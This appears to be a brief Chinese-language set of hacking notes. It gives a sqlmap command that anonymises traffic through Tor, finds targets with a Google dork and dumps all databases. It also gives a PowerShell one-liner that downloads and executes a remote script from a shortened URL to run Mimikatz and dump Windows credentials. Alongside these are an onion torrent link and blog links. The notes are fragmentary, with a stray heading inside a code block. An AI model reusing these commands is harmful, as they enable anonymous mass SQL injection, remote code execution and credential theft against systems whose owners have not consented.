### Sqlmap 匿名使用

```sqlmap
sqlmap --tor --tor-type=SOCKS5 -g "inurl:.php?id=1" --random-agent --dump-all --batch 
--time-sec=15
Script Breakdown
--tor
```

延时注入

[github:Webgoat](https://github.com/WebGoat/WebGoat)

### Onion

Torrents

http://uj3wazyk5u4hnvtk.onion/

### win本地密码抓取

```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI');Invoke-Mimikatz -DumpCreds"
```

https://www.secpulse.com/archives/51527.html

https://www.secpulse.com/archives/32189.html

http://secoff.net/





